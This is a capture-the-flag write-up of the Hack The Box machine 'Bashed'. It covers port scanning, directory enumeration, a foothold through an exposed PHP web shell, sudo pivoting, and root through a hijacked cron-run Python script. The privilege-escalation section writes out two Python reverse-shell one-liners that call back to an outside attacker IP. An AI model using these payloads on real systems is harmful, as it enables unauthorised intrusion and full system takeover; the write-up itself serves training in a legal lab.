---
title: "Bashed"
difficulty: Easy
os: Linux
points: 20
rating: 4.7
date: 2017-12-09
avatar: assets/htb/bashed.png
tags: [OS Command Injection, Code Execution, Reconnaissance, Web Site Structure Discovery, SUDO Exploitation, Scheduled Job Abuse, Apache, Web Application]
htb_url: https://app.hackthebox.com/machines/Bashed
---

## Summary

Bashed is an Easy Linux (Ubuntu) machine that hosts Arrexel's development site on port 80. The site exposes a web-based PHP shell (`phpbash.php`) under `/dev`, which gives an immediate `www-data` foothold. From there, `sudo` rights allow running commands as `scriptmanager`, who owns a `/scripts` directory containing a `test.py` executed every minute by a root cron job — overwriting that script with a reverse shell yields root.

## Enumeration

I started by adding the target to my hosts file and laying out a working directory for the box. At the end of the engagement the appended hosts entry can be removed again.

```bash
su
echo "<YOUR_IP> bashed.htb" >> /etc/hosts

mkdir -p htb/bashed.htb
cd htb/bashed.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

My usual first step is to ping the host, which both confirms it is reachable and hints at the underlying OS.

```bash
ping -c 3 bashed.htb
PING bashed.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from bashed.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=67.3 ms
64 bytes from bashed.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=64.2 ms
64 bytes from bashed.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=79.4 ms
```

From the three ICMP replies the TTL sits around \~64, which points to a \*nix host, whereas Windows boxes typically report a TTL near 128.

### Port scanning

A full TCP SYN scan turns up a single open port on the box: 80.

```bash
nmap -p0- -sS -Pn -vvv bashed.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

Next, I ran a more focused scan with the `-sCV` flags to grab service versions and run the standard scripts. Port 80 is serving Apache httpd 2.4.18 on Ubuntu, with the page title "Arrexel's Development Site".

```bash
nmap -p80 -sS -Pn -n -v -sCV -T4 bashed.htb -oG nmap/port_scan
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
```

### Web enumeration

Opening port 80 in the browser shows a site that references a php-based bash shell. The page source reveals nothing useful, so I gathered more details about the site with whatweb and enumerated directories with gobuster.

```bash
whatweb bashed.htb
http://bashed.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[<YOUR_IP>], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
```

```
gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt
```

The scan surfaces some notable directories like `/dev` and `/uploads`. Inside `/dev` there are two php web shells: `phpbash.min.php` is likely a stripped-down or beta build, while `phpbash.php` is the complete version. So the relative path containing `phpbash.php` is `/dev`.

## Foothold

Either web shell drops me straight into command execution on the box, and both report the same running user right away — the webserver is running as `www-data`.

Browsing the filesystem makes it easy to locate the user home directories and grab arrexel's flag.

```bash
cat /home/arrexel/user.txt
b2e6************************40cb
```

## Privilege Escalation

Running `sudo -l` shows that `www-data` is allowed to run every command on the box as the user `scriptmanager`, without a password.

To make interaction easier, I dropped into a reverse shell on my attacker box. I started a listener with `nc -lvnp 1339` and ran a python one-liner from the web shell.

```python
export RHOST="10.10.14.6";export RPORT=1339;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

### Pivoting to scriptmanager

Reviewing the permissions on each folder in the system root with `ls -l` shows that `/scripts` is owned by `scriptmanager` and not accessible to `www-data`. Since `www-data` can run commands as `scriptmanager`, I switched to that user and spawned a bash shell.

```bash
sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Attempting `sudo -l` as scriptmanager prompts for a password I don't have, so that path is closed.

### Abusing the root cron job

I now have access to the `/scripts` directory, which holds two files: `test.py` and `test.txt`. Judging by the last-access time on `test.txt`, the `test.py` program seems to run roughly once a minute. This suggests a root-owned cron job that runs `test.py` every minute — the file being run by root every couple of minutes is `test.py`. I verified it by renaming `test.txt` (for example to `test.txt.old`) and watching a fresh `test.txt` reappear about a minute later.

This matters because editing `test.py` to add reverse shell code would cause that code to run as root. I created a new `test.py` containing a reverse shell payload and placed it in the `/scripts` directory.

```python
echo "import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('10.10.14.6',4444));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(['/bin/sh','-i']);" > test.py
```

Within roughly two minutes, my netcat listener on the attacker machine catches the connection and hands me a shell running as root.

```bash
cat /root/root.txt
40ca************************bcfe
```

---
